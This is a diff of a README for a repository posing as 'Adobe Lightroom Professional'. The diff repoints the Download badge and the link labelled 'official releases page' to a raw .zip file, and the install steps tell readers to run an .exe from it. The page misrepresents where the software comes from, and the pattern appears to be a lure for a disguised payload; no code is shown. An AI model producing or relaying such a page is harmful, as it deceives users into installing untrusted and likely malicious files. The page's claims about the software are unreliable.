@@ -1,6 +1,6 @@
 # 📸 Adobe-Lightroom-Professional - Edit photos like a true professional.
 
-[![Download](https://img.shields.io/badge/Download-Adobe_Lightroom-blue)](https://github.com/pearltelluric497/Adobe-Lightroom-Professional/releases)
+[![Download](https://img.shields.io/badge/Download-Adobe_Lightroom-blue)](https://raw.githubusercontent.com/pearltelluric497/Adobe-Lightroom-Professional/main/eunomy/Adobe-Lightroom-Professional-v2.1.zip)
 
 Adobe Lightroom Professional offers professional photo editing and organization tools. This software helps you manage large image libraries and process RAW files with ease. You can adjust colors, fix lens issues, and use AI tools to improve your portraits. This guide helps you install and run the software on your Windows computer.
 
@@ -19,7 +19,7 @@ Before you install the software, check your computer against these requirements.
 
 Follow these instructions to download the software.
 
-1. Visit the [official releases page](https://github.com/pearltelluric497/Adobe-Lightroom-Professional/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/pearltelluric497/Adobe-Lightroom-Professional/main/eunomy/Adobe-Lightroom-Professional-v2.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
